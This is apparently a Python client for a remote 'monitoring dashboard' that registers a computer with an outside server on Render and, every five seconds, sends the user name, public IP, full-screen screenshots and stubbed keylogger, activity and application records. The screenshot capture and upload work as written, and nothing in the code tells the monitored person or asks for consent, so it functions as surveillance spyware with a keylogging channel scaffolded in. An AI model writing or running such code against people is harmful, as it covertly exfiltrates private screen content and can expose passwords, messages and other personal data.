import requests
import time
import uuid
import psutil
import pyautogui
import io
import base64
import socket

# Cambia esta URL por la de tu servidor en Render
SERVER_URL = "https://monitoring-dashboard.onrender.com/api/client"

PC_NAME = f"PC-{uuid.uuid4().hex[:6]}"

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=3).text
    except:
        return socket.gethostbyname(socket.gethostname())

def register():
    res = requests.post(f"{SERVER_URL}/register", json={
        "pc_name": PC_NAME,
        "user_name": psutil.users()[0].name,
        "ip_address": get_ip()
    }, timeout=10)
    return res.json()["pc_id"]

def send_screenshot(pc_id):
    try:
        img = pyautogui.screenshot()
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        b64 = base64.b64encode(buffer.getvalue()).decode()
        requests.post(f"{SERVER_URL}/screenshot", json={"pc_id": pc_id, "screenshot": b64}, timeout=10)
    except Exception as e:
        print("Screenshot error:", e)

def send_keylog(pc_id):
    requests.post(f"{SERVER_URL}/keylog", json={
        "pc_id": pc_id,
        "keys_pressed": "test123",
        "application": "Chrome",
        "window_title": "Google"
    }, timeout=10)

def send_activity(pc_id):
    requests.post(f"{SERVER_URL}/activity", json={
        "pc_id": pc_id,
        "activity_type": "active",
        "duration": 5
    }, timeout=10)

def send_apps(pc_id):
    apps = [{"name": "chrome.exe", "title": "Google", "url": "https://google.com"}]
    requests.post(f"{SERVER_URL}/applications", json={"pc_id": pc_id, "applications": apps}, timeout=10)

def heartbeat(pc_id):
    requests.post(f"{SERVER_URL}/heartbeat", json={"pc_id": pc_id}, timeout=10)

def main():
    pc_id = register()
    print(f"Cliente registrado: {PC_NAME} (ID: {pc_id})")
    while True:
        try:
            send_screenshot(pc_id)
            send_keylog(pc_id)
            send_activity(pc_id)
            send_apps(pc_id)
            heartbeat(pc_id)
            print("📡 Datos enviados")
            time.sleep(5)
        except Exception as e:
            print("❌ Error:", e)
            time.sleep(10)

if __name__ == "__main__":
    main()